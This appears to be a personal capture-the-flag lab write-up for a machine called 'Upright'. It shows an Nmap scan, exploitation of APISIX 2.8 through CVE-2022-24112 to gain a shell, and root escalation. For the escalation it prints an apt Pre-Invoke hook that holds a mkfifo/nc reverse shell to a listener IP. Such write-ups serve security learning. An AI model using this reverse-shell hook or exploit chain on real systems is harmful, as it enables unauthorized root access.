
## NMAP

```nmap-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 03:44 UTC
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 32.97% done; ETC: 03:47 (0:01:58 remaining)
Nmap scan report for 192.168.51.220
Host is up (0.00089s latency).
Not shown: 65392 filtered tcp ports (no-response), 138 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Upright
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.99 seconds
```


## TCP 43500
site on 43500 gives 404
tried dirbuster - medium wordlist - no results
Using APISIX 2.8 - [APISIX vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-24112) exploited via searchsploit to get shell as franklin
linpeas hinted at dirtysock in snapd but not vulnerable version

Used LinPeas to find info:
	Found vulnerable cronjob run by root every minute
	root runs apt-get update
	Cron script was not editable but apt.conf.d was write-able by franklin
	Added a nc mkfifo reverse shell using apt::Update::Pre-Invoke:
```apt-get-privesc
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.51 9002 >/tmp/f"};' > 02xyz
```
**Done**
